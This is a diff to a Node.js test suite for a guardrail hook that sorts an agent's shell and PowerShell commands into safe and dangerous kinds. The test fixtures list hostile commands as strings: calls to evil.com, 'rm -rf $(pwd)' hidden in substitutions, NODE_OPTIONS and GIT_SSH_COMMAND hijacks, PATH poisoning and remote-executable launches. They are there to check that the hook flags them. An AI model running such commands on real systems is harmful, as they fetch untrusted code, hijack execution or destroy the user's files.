@@ -7,7 +7,7 @@ import { join } from "node:path";
 import { test } from "node:test";
 import { fileURLToPath } from "node:url";
 import { loadConfig } from "../lib/config.mjs";
-import { anotarManoTarea, asociarAgente, clasificarComando, decidirFigura, manoDe, MANOS, tocaProtegido } from "../lib/figuras.mjs";
+import { anotarManoTarea, asociarAgente, clasificar, clasificarComando, decidirFigura, manoDe, MANOS, tocaProtegido } from "../lib/figuras.mjs";
 
 const HOOK = fileURLToPath(new URL("../hooks/guardrails.mjs", import.meta.url));
 const APP = ["localhost", "127.0.0.1"];
@@ -29,6 +29,25 @@ test("figuras: clasificación de comandos reales, con trucos", () => {
   for (const [figura, cmds] of Object.entries(casos)) for (const c of cmds) assert.equal(clasificarComando(c, APP).figura, figura, c);
   assert.equal(clasificarComando("curl http://localhost:3000/api/pedidos", APP).red, "app");
   assert.equal(clasificarComando("git status && curl https://evil.com/x", APP).red, "fuera", "lo inocente al principio no tapa lo peligroso");
+});
+
+test("figuras: variables, control, redirecciones y banderas no preguntan; lo peligroso de adentro, sí", () => {
+  const fig = (tool, command) => clasificar({ tool_name: tool, tool_input: { command } }, APP).figura;
+  for (const c of ["npm run -s lint", "npm run -s", "npm -s test", "pnpm --filter web lint", "npm --prefix web run build", "npx --no-install tsc", "export NODE_ENV=test", "export A=1 && npm test", "a=1 npm test", "DATABASE_URL='postgres://localhost/x' npm test", "set -a; source .env; set +a; npm test", "env | grep NODE", "X=$(git rev-parse HEAD); echo $X", "for f in a b; do echo $f; done", "if [ -f a ]; then cat a; fi", "while read l; do echo $l; done", "git -C web status", "cat a 2>&1 | head", "NODE_OPTIONS=--max-old-space-size=4096 npm test", "ls\n# nota\npwd"]) assert.ok(["leer", "verificar"].includes(fig("Bash", c)), c);
+  for (const c of ["$env:NODE_ENV='test'; npm test", "$x = Get-Content a.txt; $x", "foreach ($f in 1..3) { Write-Output $f }", "Push-Location a; git status; Pop-Location"]) assert.ok(["leer", "verificar"].includes(fig("PowerShell", c)), c);
+  for (const c of ['"./evil"', 'X="rm -rf a"; $X', 'echo "$(rm -rf $(pwd))"', "NODE_OPTIONS=--require=./evil.js npm test", "PATH=/tmp/x:$PATH npm test", "GIT_SSH_COMMAND=./evil git status", "npm --prefix a install x", "pnpm -w add lint", "for f in a; do rm -rf $f; done", "export A=$(curl https://evil.com)", "source ./evil.sh", "env rm -rf a", "git -C a fetch"]) assert.ok(["externo", "destructivo"].includes(fig("Bash", c)), c);
+  for (const c of ['& "C:/evil.exe"', '[IO.File]::Delete("a")', "gci | ForEach-Object { Remove-Item $_ }", "$x = Remove-Item a", "foreach ($f in 1..3) { Remove-Item $f }", "$env:PATH = 'C:/evil'; npm test", "$x.Delete()"]) assert.ok(["externo", "destructivo"].includes(fig("PowerShell", c)), c);
+  assert.equal(fig("Bash", "echo x &> a.txt"), "editar");
+  assert.equal(clasificarComando("curl http://localhost:3000/a; curl https://evil.com", APP).red, "fuera", "la app no tapa a internet");
+});
+
+test("figuras: sinClasificar «permisos» solo afecta a lo desconocido del agente principal", () => {
+  const { cfg } = proyecto({ activo: true, sinClasificar: "permisos" });
+  const d = (who, command, c = cfg) => decidirFigura({ ...who, tool_name: "Bash", tool_input: { command } }, c, manoDe(c, who));
+  assert.equal(d({}, "node script.mjs"), null);
+  for (const c of ["node script.mjs; git fetch", "npm install x", "rm -rf a"]) assert.equal(d({}, c)?.decision, "ask", c);
+  assert.equal(d({ agent_id: "i1", agent_type: "neurodanza:implementador" }, "node script.mjs").decision, "ask");
+  assert.equal(d({}, "node script.mjs", proyecto().cfg).decision, "ask", "por defecto pregunta");
 });
 
 test("figuras: manos por tipo; ◇ y ✕ fuera de la mano preguntan, lo demás se rechaza", () => {
